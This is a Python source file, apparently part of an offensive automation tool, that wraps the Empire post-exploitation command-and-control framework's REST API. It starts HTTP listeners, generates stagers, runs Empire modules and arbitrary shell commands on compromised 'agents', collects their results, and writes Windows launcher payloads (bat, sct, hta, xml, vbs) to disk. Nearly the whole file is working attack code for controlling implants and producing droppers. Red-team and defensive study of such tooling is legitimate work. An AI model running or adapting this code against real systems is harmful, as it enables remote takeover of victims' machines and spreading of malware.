import requests
from requests import ConnectionError
import sys
from time import sleep
from src.core import print_warning, print_status, print_error, print_info
import os
import base64
import traceback


import urllib3
urllib3.disable_warnings()

class EmpireSession:

    def __init__(self,host,port,username,password):

        print_info("Connecting to Empire REST API Server on "+host+":"+str(port)+"....")
        self.host=host
        self.port=port
        self.base_url = 'https://'+host+':'+str(port)
        self.token= {'token': self.login(host,username,password)}
        if self.token['token'] is not None:
            print_status("Successfully connected to Empire server "+host)
            print_info("Starting Http Listener...")
            self.listener = self.get_listener()
            self.stager = self.generate_stager()


    def login(self, host, empire_username, empire_password):

        payload = {'username': empire_username,'password': empire_password}
        headers = {'Content-Type': 'application/json'}
        try:
            r = requests.post(self.base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
            if r.status_code == 200:
                #token['token'] = r.json()['token']
                #self.token = r.json()['token']
                return r.json()['token']

            else:
                print_error ('Authentication to Empire RESTful API Failed')
                return
                # if debug: print_debug('Status Code: {} Response: {}'.format(r.status_code, r.text))
                #sys.exit(1)
        except ConnectionError:
            print_error ('Connection Error. Check Empire RESTful API')
            return
            #sys.exit(1)

    def start_listener(self,listener_options, listener_type='http'):
        headers = {'Content-Type': 'application/json'}
        print ("Starting listener")
        r = requests.post(self.base_url + '/api/listeners/{}'.format(listener_type), params=self.token, headers=headers,
                          json=listener_options, verify=False)
        if r.status_code == 200:
            r = r.json()
            return 'http'
        #print(r.json())
        #raise

    def execute_module(self, module_name, agent_name, module_options=None):
        headers = {'Content-Type': 'application/json'}
        payload = {'Agent': agent_name}
        if module_options:
            payload.update(module_options)

        try:
            r = requests.post(self.base_url + '/api/modules/{}'.format(module_name), params=self.token, headers=headers,
                              json=payload, verify=False)
            if r.status_code == 200:
                r = r.json()
                # if debug: print_debug("Executed Module => success: {} taskID: {} msg: '{}'".format(r['success'], r['taskID'], r['msg']), agent_name)
                return r
            else:
                # print_bad("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
                print("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
        except Exception as e:
            print ("Error executing module '{}': {}".format(module_name, e), agent_name)
            # print_bad("Error executing module '{}': {}".format(module_name, e), agent_name)

    def execute_module_with_results(self,module_name, agent_name, module_options=None):
        #print ("Executing module " + module_name + " on " + agent_name)
        r = self.execute_module(module_name, agent_name, module_options)
        if r:
            #print ("Result: " + str(r['success']))
            print_info("Msg: " + r['msg'])
            #print ("Msg: " + r['msg'])
            if r['success'] is not False:

                #print ("Waiting for results...")
                print_info("Waiting for results...")

                while True:
                    for result in self.get_agent_results(agent_name)['results']:
                        done = False
                        if len(result) > 0:
                            for entry in result['AgentResults']:
                                if entry['taskID'] == r['taskID']:

                                    # Here we fix a bunch of stuff because Empire does not give standard output for all modules
                                    # This is for get_domain_sid because Empire doesn't have a "completed" string when its done
                                    if module_name == 'powershell/management/get_domain_sid':
                                        if 'S-1-5-21' in entry['results']:
                                            done = True

                                    # Empire returns "Job started: xxxxxx" as results but we need just the completed results
                                    if ' completed' in entry['results']:
                                        done = True

                                    if done == True:
                                        # if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
                                        return entry['results']
                    sleep(2)


    def run_shell_command(self, agent_name, command):
        payload = {'command': command}
        headers = {'Content-Type': 'application/json'}

        try:
            r = requests.post(self.base_url + '/api/agents/{}/shell'.format(agent_name), params=self.token, headers=headers, json=payload, verify=False)
            if r.status_code == 200:
                r = r.json()
                #if debug: print_debug("Executed Shell Command => success: {} taskID: {}".format(r['success'], r['taskID']), agent_name)
                return r
            else:
                #print_bad("Error executing shell command '{}': {}".format(command, r.json()), agent_name)
                print ("Error executing shell command '{}': {}".format(command, r.json()), agent_name)
        except Exception as e:
            #print_bad("Error executing shell command '{}': {}".format(command, e), agent_name)
            print("Error executing shell command '{}': {}".format(command, e), agent_name)


    def run_shell_command_with_results(self, agent_name, command):
        r = self.run_shell_command(agent_name, command)
        while True:
            for result in self.get_agent_results(agent_name)['results']:
                for entry in result['AgentResults']:
                    if entry['taskID'] == r['taskID']:
                        #if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
                        return entry['results']
            sleep(2)

    def get_agent_results(self,agent_name):
        r = requests.get(self.base_url + '/api/agents/{}/results'.format(agent_name), params=self.token, verify=False)
        if r.status_code == 200:
            return r.json()
        print(r.json())
        #raise

    ## MV Functions

    def get_agents(self):
        r = requests.get( self.base_url + '/api/agents', params=self.token, verify=False)
        if r.status_code == 200:
            return  r.json()

    def list_agents(self):

        print ("Name" + "\t\t" + "Hostname" + "\t" + "IP" + "\t\t\t", "OS" + "\t\t\t\t" + "Admin Privs")
        for agent in self.get_agents()['agents']:
            print (agent['name'] + "\t" + agent['hostname'] + "\t" + agent['external_ip'] + "\t" + agent[
                'os_details'] + "\t" + str(agent['high_integrity']))
        print ("\n")

    def kill_all_agents(self):
        headers = {'Content-Type': 'application/json'}
        r = requests.post( self.base_url + '/api/agents/all/kill', params=self.token, headers=headers, verify=False)
        if r.status_code == 200:
            return  r.json()

    def remove_stale_agents(self):
        r = requests.delete( self.base_url + '/api/agents/stale', params=self.token, verify=False)
        if r.status_code == 200:
            return  r.json()

    def clear_agents(self):

        self.kill_all_agents()
        self.remove_stale_agents()

    def get_http_listener(self, listener_name='http'):
        r = requests.get(self.base_url + '/api/listeners/{}'.format(listener_name), params=self.token, verify=False)
        if r.status_code == 200:
            return r.json()
        return False

    def get_listener(self):
        if not self.get_http_listener():
            listener_opts = {'Name': 'http','Host':self.host,'Port': 80}
            return self.start_listener(listener_opts)
        else:
            return 'http'

    def generate_stager(self, listener='http'):
        headers = {'Content-Type': 'application/json'}
        stager_options = {'StagerName': 'multi/launcher','Listener': listener}
        r = requests.post(self.base_url + '/api/stagers', params=self.token, headers=headers,
                          json=stager_options, verify=False)
        return r.json()['multi/launcher']['Output']

    def generate_stagers(self, listener='http'):

        path= os.getcwd()+'/stagers'

        headers = {'Content-Type': 'application/json'}
        launchers = ['windows/launcher_bat','windows/launcher_sct','windows/hta','windows/launcher_xml','windows/launcher_vbs']

        for launcher in launchers:
            filename = ("/"+launcher[7:]).replace('_','.') if "hta" not in launcher else "/"+launcher.replace("windows","launcher").replace("/",".")

            stager_options = {'StagerName': launcher,'Listener': listener}
            r = requests.post(self.base_url + '/api/stagers', params=self.token, headers=headers,
                              json=stager_options, verify=False)
            newfile = (r.json()[launcher]['Output'])
            try:
                output_file = open(path + filename, 'w')
                if "hta" not in launcher:
                    newfile = base64.b64decode(newfile)
                    output_file = open(path + filename, 'wb')
                output_file.write(newfile)
                output_file.close()
            except:
                print_error("Could not create stagers. Check permissions")
                print(traceback.format_exc())
